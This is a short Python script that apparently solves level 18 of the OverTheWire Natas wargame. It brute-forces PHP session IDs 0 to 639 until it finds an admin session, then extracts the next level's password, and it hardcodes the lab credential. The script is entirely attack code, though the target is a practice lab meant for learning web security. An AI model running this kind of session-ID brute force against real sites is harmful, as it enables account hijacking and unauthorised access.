#!/usr/local/bin/python3
import requests
import re

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

url = 'http://%s.natas.labs.overthewire.org/?debug' % username

session = requests.session()

data = {"username": "admin", "password": "admin", "admin": "admin"}

for i in range(0, 640):
    response = session.get(url, auth=(username, password), data=data, cookies={'PHPSESSID': '%s' % i})
    content = response.text
    print('trying ' + str(i))
    if ("You are an admin" in content):
        print('password for natas19 is: %s' % re.findall('Password: (.*)</pre', content)[0])
        break
